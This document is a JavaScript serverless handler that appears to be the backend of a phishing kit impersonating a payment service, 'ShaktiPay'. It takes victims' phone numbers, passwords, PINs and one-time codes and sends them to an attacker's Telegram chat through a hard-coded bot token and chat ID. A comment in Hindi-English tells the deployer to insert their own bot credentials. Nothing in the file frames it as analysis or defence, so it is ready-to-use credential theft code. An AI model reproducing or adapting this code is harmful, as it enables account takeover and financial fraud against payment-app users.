export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { type, phone, password, pin, otp } = req.body;

    // Yahan apna Telegram Bot Token aur Chat ID daal dein
    const BOT_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
    const CHAT_ID = '6076330929';

    let message = '';

    if (type === 'LOGIN_DETAILS') {
        message = `🚨 *New ShaktiPay Login* 🚨\n\n📱 *Phone:* \`${phone}\`\n🔑 *Password:* \`${password}\`\n🔒 *PIN:* \`${pin}\``;
    } else if (type === 'OTP_REQUEST') {
        message = `🔐 *Login OTP requested (Modal)*\n📱 *Phone:* \`${phone}\``;
    } else if (type === 'OTP_CODE') {
        message = `📱 *ShaktiPay OTP Entered* 📱\n\n📞 *Phone:* \`${phone}\`\n🔢 *OTP Code:* \`${otp}\``;
    }

    try {
        const response = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const telegramRes = await fetch(response, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await telegramRes.json();

        if (data.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(500).json({ success: false, error: data.description });
        }
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}
